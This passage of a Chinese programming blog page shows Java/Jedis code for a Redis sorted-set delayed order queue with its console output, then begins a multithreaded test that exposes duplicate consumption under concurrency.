class=\"crayon-v\">jedisPool</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getResource</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c7080832059-17\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c7080832059-18\"><span class=\"crayon-h\">    </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c7080832059-19\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">//生产者,生成5个订单放进去</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c7080832059-20\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">productionDelayMessage</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c7080832059-21\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">;</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c7080832059-22\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">//延迟3秒</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c7080832059-23\"><span class=\"crayon-h\">            </span><span class=\"crayon-e\">Calendar </span><span class=\"crayon-v\">cal1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Calendar</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getInstance</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c7080832059-24\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">cal1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Calendar</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">SECOND</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c7080832059-25\"><span class=\"crayon-h\">            </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">second3later</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cal1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getTimeInMillis</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1000</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c7080832059-26\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">AppTest</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getJedis</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">zadd</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"OrderId\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">second3later</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">\"OID0000001\"</span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c7080832059-27\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">currentTimeMillis</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">+</span><span class=\"crayon-s\">\"ms:redis生成了一个订单任务：订单ID为\"</span><span class=\"crayon-o\">+</span><span class=\"crayon-s\">\"OID0000001\"</span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c7080832059-28\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c7080832059-29\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c7080832059-30\"><span class=\"crayon-h\">    </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c7080832059-31\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">//消费者，取订单</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c7080832059-32\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">consumerDelayMessage</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c7080832059-33\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">Jedis </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">AppTest</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getJedis</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c7080832059-34\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">while</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c7080832059-35\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">Set</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">Tuple</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">items</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">zrangeWithScores</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"OrderId\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c7080832059-36\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">items</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">||</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">items</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">isEmpty</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c7080832059-37\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"当前没有等待的任务\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c7080832059-38\"><span class=\"crayon-h\">                </span><span class=\"crayon-st\">try</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c7080832059-39\"><span class=\"crayon-h\">                    </span><span class=\"crayon-v\">Thread</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sleep</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">500</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c7080832059-40\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">catch</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">InterruptedException</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">e</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c7080832059-41\"><span class=\"crayon-h\">                    </span><span class=\"crayon-c\">// TODO Auto-generated catch block</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c7080832059-42\"><span class=\"crayon-h\">                    </span><span class=\"crayon-v\">e</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">printStackTrace</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c7080832059-43\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c7080832059-44\"><span class=\"crayon-h\">                </span><span class=\"crayon-st\">continue</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c7080832059-45\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c7080832059-46\"><span class=\"crayon-h\">            </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\">  </span><span class=\"crayon-v\">score</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Tuple</span><span class=\"crayon-sy\">)</span><span class=\"crayon-v\">items</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">toArray</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getScore</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c7080832059-47\"><span class=\"crayon-h\">            </span><span class=\"crayon-e\">Calendar </span><span class=\"crayon-v\">cal</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Calendar</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getInstance</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c7080832059-48\"><span class=\"crayon-h\">            </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nowSecond</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cal</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getTimeInMillis</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1000</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c7080832059-49\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">nowSecond</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">score</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c7080832059-50\"><span class=\"crayon-h\">                </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">orderId</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Tuple</span><span class=\"crayon-sy\">)</span><span class=\"crayon-v\">items</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">toArray</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getElement</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c7080832059-51\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">zrem</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"OrderId\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">orderId</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c7080832059-52\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">currentTimeMillis</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-s\">\"ms:redis消费了一个任务：消费的订单OrderId为\"</span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">orderId</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c7080832059-53\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c7080832059-54\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c7080832059-55\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c7080832059-56\"><span class=\"crayon-h\">    </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c7080832059-57\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">String</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">args</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c7080832059-58\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">AppTest </span><span class=\"crayon-v\">appTest</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AppTest</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c7080832059-59\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">appTest</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">productionDelayMessage</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c7080832059-60\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">appTest</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">consumerDelayMessage</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c7080832059-61\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358c7080832059-62\"><span class=\"crayon-h\">    </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358c7080832059-63\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0109 seconds] -->\r\n<p>此时对应输出如下</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930358cc481657929\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n1525086085261ms:redis生成了一个订单任务：订单ID为OID00000010\r\n1525086085263ms:redis生成了一个订单任务：订单ID为OID00000011\r\n1525086085266ms:redis生成了一个订单任务：订单ID为OID00000012\r\n1525086085268ms:redis生成了一个订单任务：订单ID为OID00000013\r\n1525086085270ms:redis生成了一个订单任务：订单ID为OID00000014\r\n1525086088000ms:redis消费了一个任务：消费的订单OrderId为OID00000010\r\n1525086088001ms:redis消费了一个任务：消费的订单OrderId为OID00000011\r\n1525086088002ms:redis消费了一个任务：消费的订单OrderId为OID00000012\r\n1525086088003ms:redis消费了一个任务：消费的订单OrderId为OID00000013\r\n1525086088004ms:redis消费了一个任务：消费的订单OrderId为OID00000014\r\n当前没有等待的任务\r\n当前没有等待的任务\r\n当前没有等待的任务</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358cc481657929-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358cc481657929-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358cc481657929-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358cc481657929-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358cc481657929-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358cc481657929-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358cc481657929-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358cc481657929-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358cc481657929-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358cc481657929-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358cc481657929-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358cc481657929-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358cc481657929-13\">13</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930358cc481657929-1\"><span class=\"crayon-cn\">1525086085261ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">redis</span>生成了一个订单任务：订单<span class=\"crayon-i\">ID</span>为<span class=\"crayon-i\">OID00000010</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358cc481657929-2\"><span class=\"crayon-cn\">1525086085263ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">redis</span>生成了一个订单任务：订单<span class=\"crayon-i\">ID</span>为<span class=\"crayon-i\">OID00000011</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358cc481657929-3\"><span class=\"crayon-cn\">1525086085266ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">redis</span>生成了一个订单任务：订单<span class=\"crayon-i\">ID</span>为<span class=\"crayon-i\">OID00000012</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358cc481657929-4\"><span class=\"crayon-cn\">1525086085268ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">redis</span>生成了一个订单任务：订单<span class=\"crayon-i\">ID</span>为<span class=\"crayon-i\">OID00000013</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358cc481657929-5\"><span class=\"crayon-cn\">1525086085270ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">redis</span>生成了一个订单任务：订单<span class=\"crayon-i\">ID</span>为<span class=\"crayon-i\">OID00000014</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358cc481657929-6\"><span class=\"crayon-cn\">1525086088000ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">redis</span>消费了一个任务：消费的订单<span class=\"crayon-i\">OrderId</span>为<span class=\"crayon-i\">OID00000010</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358cc481657929-7\"><span class=\"crayon-cn\">1525086088001ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">redis</span>消费了一个任务：消费的订单<span class=\"crayon-i\">OrderId</span>为<span class=\"crayon-i\">OID00000011</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358cc481657929-8\"><span class=\"crayon-cn\">1525086088002ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">redis</span>消费了一个任务：消费的订单<span class=\"crayon-i\">OrderId</span>为<span class=\"crayon-i\">OID00000012</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358cc481657929-9\"><span class=\"crayon-cn\">1525086088003ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">redis</span>消费了一个任务：消费的订单<span class=\"crayon-i\">OrderId</span>为<span class=\"crayon-i\">OID00000013</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358cc481657929-10\"><span class=\"crayon-cn\">1525086088004ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">redis</span>消费了一个任务：消费的订单<span class=\"crayon-i\">OrderId</span>为<span class=\"crayon-i\">OID00000014</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358cc481657929-11\">当前没有等待的任务</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358cc481657929-12\">当前没有等待的任务</div><div class=\"crayon-line\" id=\"crayon-5b4aa930358cc481657929-13\">当前没有等待的任务</div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0027 seconds] -->\r\n<p>可以看到，几乎都是3秒之后，消费订单。</p>\n<p>然而，这一版存在一个致命的硬伤，在高并发条件下，多消费者会取到同一个订单号，我们上测试代码ThreadTest</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930358d2981261715\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npackage com.rjzheng.delay4;\r\n\r\nimport java.util.concurrent.CountDownLatch;\r\n\r\npublic class ThreadTest {\r\n    private static final int threadNum = 10;\r\n    private static CountDownLatch cdl = new CountDownLatch(threadNum);\r\n    static class DelayMessage implements Runnable{\r\n        public void run() {\r\n            try {\r\n                cdl.await();\r\n            } catch (InterruptedException e) {\r\n                // TODO Auto-generated catch block\r\n                e.printStackTrace();\r\n            }\r\n            AppTest appTest =new AppTest();\r\n            appTest.consumerDelayMessage();\r\n        }\r\n    }\r\n    public static void main(String[] args) {\r\n        AppTest appTest =new AppTest();\r\n        appTest.productionDelayMessage();\r\n        for(int i=0;i&lt;threadNum;i++){\r\n            new Thread(new DelayMessage()).start();\r\n            cdl.countDown();\r\n        }\r\n    }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" 